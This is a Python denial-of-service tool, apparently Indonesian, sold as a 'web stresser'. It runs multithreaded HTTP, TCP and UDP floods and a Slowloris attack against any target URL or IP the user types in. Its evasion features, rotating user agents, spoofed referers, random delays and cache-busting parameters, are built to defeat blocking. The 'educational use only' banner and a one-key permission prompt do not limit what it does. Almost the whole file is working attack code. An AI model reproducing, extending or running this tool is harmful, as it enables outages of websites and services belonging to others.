#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ═══════════════════════════════════════════════════════════════════════════════
#                    🔥 OMEGA WEB STRESSER v2.0 🔥
#                         EXTREME EDITION
#                         BY: 𝙳𝚎𝚊𝚝Nex
#              ⚠️  EDUCATIONAL USE ONLY - TEST YOUR OWN SERVERS ⚠️
# ═══════════════════════════════════════════════════════════════════════════════

import sys
import time
import random
import threading
import requests
import socket
import ssl
import os
from datetime import datetime
from urllib.parse import urlparse

# Warna terminal
if os.name == 'nt':
    G = R = Y = B = C = W = BOLD = RESET = ''
else:
    G = '\033[92m'; R = '\033[91m'; Y = '\033[93m'
    B = '\033[94m'; C = '\033[96m'; W = '\033[97m'
    BOLD = '\033[1m'; RESET = '\033[0m'

# Banner
BANNER = f"""
{R}{BOLD}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                    🔥 OMEGA WEB STRESSER v2.0 🔥                              ║
║                         EXTREME EDITION                                       ║
║                    BY: {Y}𝙳𝚎𝚊𝚝Nex{R}                                                     ║
║         ⚡ ULTRA STEALTH | SLOWLORIS | MULTI-VECTOR ⚡                         ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{RESET}
"""

# ========== ANTI-BLOCK USER AGENTS (15+) ==========
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
]

# ========== RANDOM REFERERS ==========
REFERERS = [
    'https://google.com', 'https://facebook.com', 'https://youtube.com',
    'https://instagram.com', 'https://github.com', 'https://twitter.com',
    'https://tiktok.com', 'https://reddit.com', 'https://linkedin.com',
    'https://whatsapp.com', 'https://netflix.com', 'https://spotify.com',
]

# ========== ACCEPT LANGUAGES ==========
ACCEPT_LANGUAGES = [
    'en-US,en;q=0.9', 'id-ID,id;q=0.9,en;q=0.8', 'en-GB,en;q=0.9',
    'id,en;q=0.9', 'en-US,en;q=0.9,id;q=0.8',
]

# ========== GLOBAL STATS ==========
stats = {'total': 0, 'success': 0, 'failed': 0, 'running': True, 'start': 0}
slowloris_sockets = []


# ========== STEALTH HEADERS ==========
def get_stealth_headers():
    """Generate random headers untuk anti-block"""
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Referer': random.choice(REFERERS),
        'Accept-Language': random.choice(ACCEPT_LANGUAGES),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': random.choice(['max-age=0', 'no-cache', 'no-store']),
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'DNT': '1',
    }


def get_random_delay():
    """Random delay 0.01 - 0.2 detik (biar natural)"""
    return random.uniform(0.01, 0.2)


def random_query_param(url):
    """Bypass cache dengan random query parameter"""
    if '?' in url:
        return url + f'&_r={random.randint(100000, 999999)}'
    else:
        return url + f'?_r={random.randint(100000, 999999)}'


# ========== HTTP FLOOD (ANTI-BLOCK) ==========
def http_flood_worker(target):
    """HTTP Flood dengan anti-block complete"""
    session = requests.Session()
    session.verify = False
    
    while stats['running']:
        try:
            url = random_query_param(target)
            headers = get_stealth_headers()
            delay = get_random_delay()
            
            if random.random() < 0.3:
                response = session.post(url, headers=headers, data={'x': 'x'*random.randint(100,500)}, timeout=3)
            else:
                response = session.get(url, headers=headers, timeout=3)
            
            stats['success'] += 1
            time.sleep(delay)
            
        except Exception as e:
            stats['failed'] += 1
        
        stats['total'] += 1


# ========== TCP FLOOD ==========
def tcp_flood_worker(target_ip, target_port):
    """TCP Flood untuk banjirin port"""
    while stats['running']:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, target_port))
            
            # Random payload biar gak ketahuan
            payload = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n"
            sock.send(payload.encode() * random.randint(1, 5))
            sock.close()
            stats['success'] += 1
            
        except:
            stats['failed'] += 1
        
        stats['total'] += 1
        time.sleep(random.uniform(0.01, 0.05))


# ========== UDP FLOOD ==========
def udp_flood_worker(target_ip, target_port):
    """UDP Flood untuk banjirin port UDP"""
    payloads = [b"X" * 1024, b"GET / HTTP/1.1\r\n" * 10, os.urandom(1024)]
    
    while stats['running']:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random.choice(payloads)
            sock.sendto(payload, (target_ip, target_port))
            sock.close()
            stats['success'] += 1
            
        except:
            stats['failed'] += 1
        
        stats['total'] += 1
        time.sleep(random.uniform(0.005, 0.02))


# ========== SLOWLORIS ATTACK (SANGAT BERBAHAYA) ==========
def slowloris_worker(target_ip, target_port, socket_count=200):
    """Slowloris Attack - Bikin server kehabisan koneksi"""
    sockets = []
    
    # Buka banyak socket
    for i in range(socket_count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target_ip, target_port))
            sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {target_ip}\r\n".encode())
            sock.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            sock.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode())
            sockets.append(sock)
            stats['success'] += 1
        except:
            stats['failed'] += 1
    
    # Keep them alive (kirim header terus)
    while stats['running']:
        for sock in sockets[:]:
            try:
                sock.send(f"X-Random-Header: {random.randint(1, 5000)}\r\n".encode())
                stats['success'] += 1
            except:
                sockets.remove(sock)
                try:
                    new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_sock.settimeout(4)
                    new_sock.connect((target_ip, target_port))
                    new_sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                    new_sock.send(f"Host: {target_ip}\r\n".encode())
                    sockets.append(new_sock)
                except:
                    pass
        
        stats['total'] += len(sockets)
        time.sleep(10)  # Kirim header setiap 10 detik


# ========== MONITOR ==========
def monitor(duration):
    """Monitor durasi attack"""
    while stats['running'] and duration > 0:
        time.sleep(1)
        if time.time() - stats['start'] >= duration:
            stats['running'] = False
            break


# ========== MAIN ==========
def main():
    os.system('clear')
    print(BANNER)
    
    # Input target
    target = input(f"{Y}[?] Target URL/IP (http://...): {RESET}")
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Pilih mode attack
    print(f"\n{C}┌─────────────────────────────────────────────────────────────┐{RESET}")
    print(f"{C}│{RESET}  {Y}PILIH MODE SERANGAN{RESET}                                              {C}│{RESET}")
    print(f"{C}│{RESET}  1. HTTP Flood (Anti-Block) — untuk web server                          {C}│{RESET}")
    print(f"{C}│{RESET}  2. TCP Flood — untuk port TCP (SSH, HTTP, dll)                        {C}│{RESET}")
    print(f"{C}│{RESET}  3. UDP Flood — untuk port UDP (DNS, Game)                             {C}│{RESET}")
    print(f"{C}│{RESET}  4. SLOWLORIS — SERVER KEHABISAN KONEKSI! 💀                           {C}│{RESET}")
    print(f"{C}│{RESET}  5. ALL MODE (Semua sekaligus) ⚡                                      {C}│{RESET}")
    print(f"{C}└─────────────────────────────────────────────────────────────┘{RESET}")
    
    mode = input(f"{Y}[?] Pilih mode (1-5): {RESET}")
    threads = int(input(f"{Y}[?] Threads per mode (100-2000): {RESET}"))
    duration = int(input(f"{Y}[?] Durasi (detik): {RESET}"))
    
    # Parse target untuk TCP/UDP/Slowloris
    parsed = urlparse(target)
    host = parsed.netloc or parsed.path
    target_ip = host.split(':')[0]
    target_port = 80 if 'http' in target else 443
    
    # Validasi
    if not any(x in target for x in ['localhost', '127.0.0.1', '192.168.', '10.']):
        print(f"\n{R}{BOLD}⚠️ PERINGATAN! Target bukan IP private!{RESET}")
        confirm = input(f"{Y}Anda memiliki izin? (y/n): {RESET}")
        if confirm.lower() != 'y':
            print(f"{R}❌ Dibatalkan.{RESET}")
            sys.exit()
    
    print(f"\n{G}✓ Memulai serangan ke {target}{RESET}")
    print(f"{G}✓ Mode: {mode}{RESET}")
    print(f"{G}✓ Threads: {threads} | Duration: {duration}s{RESET}")
    print(f"{C}🛡️ ANTI-BLOCK: ACTIVE (15+ UA | Random Referer | Random Delay){RESET}\n")
    
    stats['start'] = time.time()
    stats['running'] = True
    
    # Start threads berdasarkan mode
    if mode == '1' or mode == '5':
        for _ in range(threads):
            threading.Thread(target=http_flood_worker, args=(target,)).start()
    
    if mode == '2' or mode == '5':
        for _ in range(threads // 2):
            threading.Thread(target=tcp_flood_worker, args=(target_ip, target_port)).start()
    
    if mode == '3' or mode == '5':
        for _ in range(threads // 2):
            threading.Thread(target=udp_flood_worker, args=(target_ip, target_port)).start()
    
    if mode == '4':
        print(f"{R}💀 SLOWLORIS MODE AKTIF! Server akan kehabisan koneksi!{RESET}")
        for _ in range(min(threads, 10)):  # Slowloris butuh sedikit thread
            threading.Thread(target=slowloris_worker, args=(target_ip, target_port, 200)).start()
    
    if mode == '5':
        print(f"{R}💀 ALL MODE AKTIF! Semua serangan jalan bersamaan!{RESET}")
        threading.Thread(target=slowloris_worker, args=(target_ip, target_port, 100)).start()
    
    # Monitor thread
    threading.Thread(target=monitor, args=(duration,)).start()
    
    # Live stats
    last_total = 0
    try:
        while stats['running']:
            time.sleep(1)
            elapsed = int(time.time() - stats['start'])
            rps = stats['total'] - last_total
            last_total = stats['total']
            
            print(f"\r{G}📊 Total: {stats['total']:8} | ✅ Success: {stats['success']:8} | ❌ Failed: {stats['failed']:6} | ⚡ RPS: {rps:5} | ⏱️ {elapsed}s{RESET}", end='')
    except KeyboardInterrupt:
        stats['running'] = False
        print()
    
    # Final report
    rate = (stats['success'] / stats['total'] * 100) if stats['total'] > 0 else 0
    print(f"\n\n{C}{BOLD}══════════ FINAL REPORT ══════════{RESET}")
    print(f"{G}✅ Total Requests : {stats['total']}{RESET}")
    print(f"{G}✅ Success        : {stats['success']}{RESET}")
    print(f"{R}❌ Failed         : {stats['failed']}{RESET}")
    print(f"{Y}📈 Success Rate   : {rate:.2f}%{RESET}")
    print(f"{Y}{BOLD}⚠️ Pastikan testing sesuai scope izin!{RESET}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        stats['running'] = False
        print(f"\n{Y}⚠️ Dihentikan user{RESET}")
        sys.exit()
